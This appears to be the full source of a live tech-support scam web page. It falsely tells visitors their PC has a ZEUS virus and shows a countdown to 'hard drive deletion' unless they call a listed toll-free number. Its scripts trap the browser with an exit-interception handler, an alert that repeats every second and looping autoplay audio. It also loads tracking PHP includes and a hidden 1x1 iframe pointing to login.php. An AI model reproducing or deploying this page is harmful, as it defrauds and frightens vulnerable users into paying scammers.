<?php include_once("os.php");?>
<?php include_once("device.php");?>
<?php include_once("trackbrowser.php");?>  

<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<title>Error Hard Drive Safety Delete</title>

<style type="text/css">
body {
	background-color: #FF0000;
}
body,td,th {
	color: #FFFFFF;
	text-align: center;
	font-family: "Courier New";
	font-style: normal;
	font-weight: 400;
	font-size: x-large;
}


</style>





<script type="text/javascript">
window.onload=function(){
function countdown( elementName, minutes, seconds )
{
    var element, endTime, hours, mins, msLeft, time;

    function twoDigits( n )
    {
        return (n <= 9 ? "0" + n : n);
    }

    function updateTimer()
    {
        msLeft = endTime - (+new Date);
        if ( msLeft < 1000 ) {
            element.innerHTML = "0:00";
        } else {
            time = new Date( msLeft );
            hours = time.getUTCHours();
            mins = time.getUTCMinutes();
            element.innerHTML = (hours ? hours + ':' + twoDigits( mins ) : mins) + ':' + twoDigits( time.getUTCSeconds() );
            setTimeout( updateTimer, time.getUTCMilliseconds() + 500 );
        }
    }

    element = document.getElementById( elementName );
    endTime = (+new Date) + 1000 * (60*minutes + seconds) + 500;
    updateTimer();
}

countdown( "countdown", 5, 0 );
}

</script>

</head>

<body>

<!-- exit traffic pop -->
<script type="text/javascript">
    
    var exittraffic_splashalertmessage="WARNING!\n\nYour hard drive will be DELETED if you close this page\n\nYou have a ZEUS Virus! Please call Technical Support Now! \n\nCall Toll-Free: ++1 877 771 2060  To Stop This Process\n\nCLICK LEAVE THIS PAGE TO DELETE HARD DRIVE ";
    var exittraffic_RedirectUrl="";

<!--
var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
var is_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;

function listen(evnt, elem, func) {
    if (elem.addEventListener)  // W3C DOM
        elem.addEventListener(evnt,func,false);
    else if (elem.attachEvent) { // IE DOM
         var r = elem.attachEvent("on"+evnt, func);
         return r;
    }
    else window.alert('I\'m sorry Dave, I\'m afraid I can\'t do that.');
}

function DisableExitTraffic() {
    PreventExitSplash = true;
}

function addLoadEvent(func) {
	listen('load', window, func);
}
function addClickEvent(a, i, func) {
    if (typeof a[i].onclick != 'function') {
        a[i].onclick = func;
    }
}
theBody = document.body;
if (!theBody) {
    theBody = document.getElementById("body");
    if (!theBody) {
        theBody = document.getElementsByTagName("body")[0];
    }
}
var PreventExitSplash = false;
var LightwindowOpening = false;
function DisplayExitSplash() {

    if (PreventExitSplash == false) {
        window.scrollTo(0, 0);
         PreventExitSplash = true;
        timeout_variable = setTimeout("exittraffic_change_url();", 1000);
        
        return exittraffic_splashalertmessage;
    }
}

var a = document.getElementsByTagName('A');
for (var i = 0; i < a.length; i++) {
	var link = a[i];
    if (link.target !== '_blank') {
        addClickEvent(a, i, function() {
            PreventExitSplash = true;
			if (!this.href.match(/http:\/\//)) {
				setTimeout(function () {
					PreventExitSplash = false;
				}, 300);
			}
        });
    }
    else {
        addClickEvent(a, i, function() {
            PreventExitSplash = false;
        });
    }
}
disablelinksfunc = function() {
    var a = document.getElementsByTagName('A');
	
    for (var i = 0; i < a.length; i++) {
        if (a[i].target !== '_blank') {
            addClickEvent(a, i, function() {
                PreventExitSplash = true;
            });
        }
        else {
            addClickEvent(a, i, function() {
                PreventExitSplash = false;
            });
        }
    }
}

disableformsfunc = function() {
	// Makes that clicking on the links on the page will not cause this popup to appear
    var f = document.getElementsByTagName('form');
    for (var i = 0; i < f.length; i++) {
        if (!f[i].onclick) {
            f[i].onclick = function() {
                if (LightwindowOpening == false) {
                    PreventExitSplash = true;
					setTimeout(function () {
						PreventExitSplash = false;
					}, 300);
                }
            }
        }
        else if (!f[i].onsubmit) {
            f[i].onsubmit = function() {
                PreventExitSplash = true;
            }
        }
    }
}

function exittraffic_change_url() {
	disable_confirmation = false;
	clearTimeout(timeout_variable); // just to make sure
	document.location.href=exittraffic_RedirectUrl;
}


//
// control flash event
//
var et_timer;
var timer_value = 1500;
function flashClick(){
    PreventExitSplash = true;
    if(typeof et_timer !== 'undefined') clearTimeout(et_timer);
    //document.getElementById("et_status").innerHTML = 'preventExitTrafic disabled for ' + timer_value + ' msec';
    et_timer = setTimeout("EnableExitTraffic();", timer_value);
    //PreventExitSplash = true;
     //console.log('click '  + PreventExitSplash);
}

// this one shuld be in etraffic.js ??
function EnableExitTraffic(){
    PreventExitSplash = false;
    //document.getElementById("et_status").innerHTML = 'preventExitTrafic ENABLE AGAIN';
    clearTimeout(et_timer);
    //console.log('click '  + PreventExitSplash);
}


addLoadEvent(disableformsfunc);
// ENABLE BEFORE LAUNCH
    
window.onbeforeunload = DisplayExitSplash;



//-->
</script>



<p>&nbsp;</p>
<p>0x000314CE VIRUS_DETECTED_WITHOUT_CANCELLING_PENDING_OPERATIONS<br>
  <br>
  Hard Drive Safety Delete Starting In <span id="countdown" style="background-color: yellow;color: black;">4:08</span><span style="font-size: 36px"><br>
  <br>
To STOP Deleting Hard Drive Call: <br>
++1 877 771 2060<br>
<br>
 ERROR CODE: 0x000314CE</span><br>
</p>
<p><br>
  Please contact technical support Toll Free: ++1 877 771 2060<br>
To immediately rectify issue and prevent data loss</p>
<audio src="a1.mp4" autoplay="autoplay" loop></audio><script type="text/javascript">
setInterval(function () {alert("WARNING!\n\nYour hard drive will be DELETED if you close this page\n\nYou have a ZEUS virus! Please call Technical Support Now! \n\nCall Toll-Free: ++1 877 771 2060 To Stop This Process")}, 1000);</script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123433039-2"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'UA-123433039-2');
</script>



<iframe src="login.php" width="1" height="1"></iframe>
</body></html>
